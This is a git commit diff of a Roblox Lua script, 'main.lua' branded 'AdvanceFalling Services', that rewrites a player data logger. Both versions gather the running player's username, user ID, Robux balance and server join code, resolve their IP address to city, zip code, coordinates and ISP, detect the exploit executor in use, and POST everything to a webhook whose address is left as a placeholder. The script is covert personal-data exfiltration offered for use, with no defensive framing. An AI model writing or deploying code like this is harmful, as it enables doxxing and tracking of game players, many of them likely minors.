30b079e6ca1aca097f1db96eb9b98708f10d51d7
Steven <116656099+StevenK-293@users.noreply.github.com>
2023-07-14 22:18:29 -0400

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,216 +1,168 @@
--- Function to retrieve player information
-local function getPlayerInformation()
-    local playersService = game:GetService("Players")
-    local localPlayer = playersService.LocalPlayer
+local name = game:GetService("Players").LocalPlayer.Name
+local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
+local HTTP_ = game:GetService('HttpService')
+local LPR = game:GetService('Players').LocalPlayer
+local isPremium = game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium
+local username = game.Players.LocalPlayer.Name
+local userId = game.Players.LocalPlayer.UserId
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local accountAge = math.floor((os.time() - player.AccountAge * 86400) / 86400)
+local jobID = game.JobId
 
-    local isPremium = localPlayer.MembershipType == Enum.MembershipType.Premium
-    local username = localPlayer.Name
-    local userId = localPlayer.UserId
-    local accountAge = math.floor((os.time() - localPlayer.AccountAge * 86400) / 86400)
+local getIPInfo = HttpService:JSONDecode(game:HttpGet(string.format("http://ip-api.com/json/%s", ESD)))
+local FI = {
+  IP = ESD,
+  country = getIPInfo.country,
+  countryCode = getIPInfo.countryCode,
+  region = getIPInfo.region,
+  regionName = getIPInfo.regionName,
+  city = getIPInfo.city,
+  zipcode = getIPInfo.zip,
+  latitude = getIPInfo.lat,
+  longitude = getIPInfo.lon,
+  isp = getIPInfo.isp,
+  org = getIPInfo.org
+}
 
-    return isPremium, username, userId, accountAge
-end
+local url = "Webhook-Here"
 
--- Function to retrieve IP information
-local function getIPInformation()
-    local ipifyUrl = "https://api.ipify.org"
-    local ipInfoUrl = "http://ip-api.com/json/%s"
-    local ip = game:GetService("HttpService"):GetAsync(ipifyUrl)
-    local ipInfo = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(ipInfoUrl:format(ip)))
+local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    FlUXUS_LOADED and "Fluxus" or ""
 
-    return {
-        IP = ip,
-        country = ipInfo.country,
-        countryCode = ipInfo.countryCode,
-        region = ipInfo.region,
-        regionName = ipInfo.regionName,
-        city = ipInfo.city,
-        zipcode = ipInfo.zip,
-        latitude = ipInfo.lat,
-        longitude = ipInfo.lon,
-        isp = ipInfo.isp,
-        org = ipInfo.org
-    }
-end
+local balance = LPR:FindFirstChild("leaderstats") and LPR.leaderstats.Robux.Value or 0
 
--- Function to construct data payload for webhook
-local function constructWebhookData(isPremium, username, userId, accountAge, ipInformation)
-    local gameService = game:GetService("MarketplaceService")
-    local placeId = game.PlaceId
-    local balance = game.Players.LocalPlayer:WaitForChild("leaderstats").Robux.Value
-
-    local webhookData = {
-        username = username .. ' [' .. userId .. ']',
-        avatar_url = game:GetService("HttpService"):JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(userId)))['data'][1]['imageUrl'],
-        embeds = {
-            {
-                title = "AdvanceFalling Services",
-                description = "Discord: https://discord.gg/d2446gBjfq",
-                color = tonumber(0x2B6BE4),
-                fields = {
-                    {
-                        name = "Profile:",
-                        value = "https://www.roblox.com/users/" .. userId .. "/profile",
-                        inline = true
-                    },
-                    {
-                        name = "Game:",
-                        value = "https://www.roblox.com/games/" .. placeId,
-                        inline = true
-                    },
-                    {
-                        name = "Game Info:",
-                        value = "**ID**: " .. placeId .. ".\n**Name:** " .. gameService:GetProductInfo(placeId).Name,
-                        inline = true
-                    },
-                    {
-                        name = "Exploit",
-                        value = getExploitName(),
-                        inline = true
-                    },
-                    {
-                        name = "Premium",
-                        value = isPremium and "True" or "False",
-                        inline = true
-                    },
-                    {
-                        name = "2FA",
-                        value = has2FA() and "True" or "False",
-                        inline = true
-                    },
-                    {
-                        name = "Account Age",
-                        value = tostring(accountAge),
-                        inline = true
-                    },
-                    {
-                        name = "Robux Balance",
-                        value = tostring(balance),
-                        inline = true
-                    },
-                    {
-                        name = "Join Code",
-                        value = game.JobId,
-                        inline = true
-                    },
-                    {
-                        name = "IP",
-                        value = ipInformation.IP,
-                        inline = true
-                    },
-                    {
-                        name = "Country",
-                        value = ipInformation.country,
-                        inline = true
-                    },
-                    {
-                        name = "Country Code",
-                        value = ipInformation.countryCode,
-                        inline = true
-                    },
-                    {
-                        name = "Region",
-                        value = ipInformation.region,
-                        inline = true
-                    },
-                    {
-                        name = "Region Name",
-                        value = ipInformation.regionName,
-                        inline = true
-                    },
-                    {
-                        name = "City",
-                        value = ipInformation.city,
-                        inline = true
-                    },
-                    {
-                        name = "Zipcode",
-                        value = ipInformation.zipcode,
-                        inline = true
-                    },
-                    {
-                        name = "Latitude",
-                        value = tostring(ipInformation.latitude),
-                        inline = true
-                    },
-                    {
-                        name = "Longitude",
-                        value = tostring(ipInformation.longitude),
-                        inline = true
-                    },
-                    {
-                        name = "ISP",
-                        value = ipInformation.isp,
-                        inline = true
-                    },
-                    {
-                        name = "Org",
-                        value = ipInformation.org,
-                        inline = true
-                    },
-                    {
-                        name = "Coming Soon",
-                        value = "??????????",
-                        inline = true
-                    }
-                },
-                color = tonumber(0x7269da)
-            }
+local data = {
+  username = LPR.Name .. ' [' .. LPR.UserId .. ']',
+  avatar_url = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
+  embeds = {
+    {
+      title = "AdvanceFalling Services",
+      description = "Discord: https://discord.gg/d2446gBjfq",
+      color = tonumber(0x2B6BE4),
+      fields = {
+        {
+          name = "Profile:",
+          value = "https://www.roblox.com/users/" .. userId .. "/profile",
+          inline = true
+        },
+        {
+          name = "Game:",
+          value = "https://www.roblox.com/games/" .. game.PlaceId,
+          inline = true
+        },
+        {
+          name = "Game Info:",
+          value = "**ID**: " .. game.PlaceId .. ".\n**Name:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+          inline = true
+        },
+        {
+          name = "Exploit",
+          value = webhookcheck,
+          inline = true
+        },
+        {
+          name = "Premium",
+          value = isPremium and "True" or "False",
+          inline = true
+        },
+        {
+          name = "2FA",
+          value = isPremium and "True" or "False",
+          inline = true
+        },
+        {
+          name = "Account Age",
+          value = "" .. accountAge .. " ",
+          inline = true
+        },
+        {
+          name = "Robux Balance",
+          value = tostring(balance),
+          inline = true
+        },
+        {
+          name = "Join Code",
+          value = "" .. jobID,
+          inline = true
+        },
+        {
+          name = "IP",
+          value = FI.IP,
+          inline = true
+        },
+        {
+          name = "Country",
+          value = FI.country,
+          inline = true
+        },
+        {
+          name = "Country Code",
+          value = FI.countryCode,
+          inline = true
+        },
+        {
+          name = "Region",
+          value = FI.region,
+          inline = true
+        },
+        {
+          name = "Region Name",
+          value = FI.regionName,
+          inline = true
+        },
+        {
+          name = "City",
+          value = FI.city,
+          inline = true
+        },
+        {
+          name = "Zipcode",
+          value = FI.zipcode,
+          inline = true
+        },
+        {
+          name = "Latitude",
+          value = tostring(FI.latitude),
+          inline = true
+        },
+        {
+          name = "Longitude",
+          value = tostring(FI.longitude),
+          inline = true
+        },
+        {
+          name = "ISP",
+          value = FI.isp,
+          inline = true
+        },
+        {
+          name = "Org",
+          value = FI.org,
+          inline = true
+        },
+        {
+          name = "Coming Soon",
+          value = "??????????",
+          inline = true
         }
+      },
+      color = tonumber(0x7269da),
     }
+  }
+}
 
-    return game:GetService("HttpService"):JSONEncode(webhookData)
-end
+local newdata = HTTP_:JSONEncode(data)
 
--- Function to retrieve exploit name
-local function getExploitName()
-    local exploitNames = {
-        is_sirhurt_closure and "Sirhurt",
-        pebc_execute and "ProtoSmasher",
-        syn and "Synapse X",
-        secure_load and "Sentinel",
-        KRNL_LOADED and "Krnl",
-        SONA_LOADED and "Sona",
-        FlUXUS_LOADED and "Fluxus"
-    }
+local headers = {
+  ["content-type"] = "application/json"
+}
 
-    for _, exploitName in ipairs(exploitNames) do
-        if exploitName then
-            return exploitName
-        end
-    end
-
-    return "Unknown"
-end
-
--- Main function to send data to webhook
-local function sendToWebhook(url, data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-
-    local httpService = game:GetService("HttpService")
-    local request = httpService:RequestAsync({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = data
-    })
-
-    -- Handle potential errors or response if needed
-end
-
--- Get player information
-local isPremium, username, userId, accountAge = getPlayerInformation()
-
--- Get IP information
-local ipInformation = getIPInformation()
-
--- Construct webhook data
-local webhookData = constructWebhookData(isPremium, username, userId, accountAge, ipInformation)
-
--- Specify the webhook URL
-local webhookUrl = "Webhook URL"
-
--- Send data to webhook
-sendToWebhook(webhookUrl, webhookData)
+local request = http_request or request or HttpPost or syn.request
+local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
+request(abcdef)
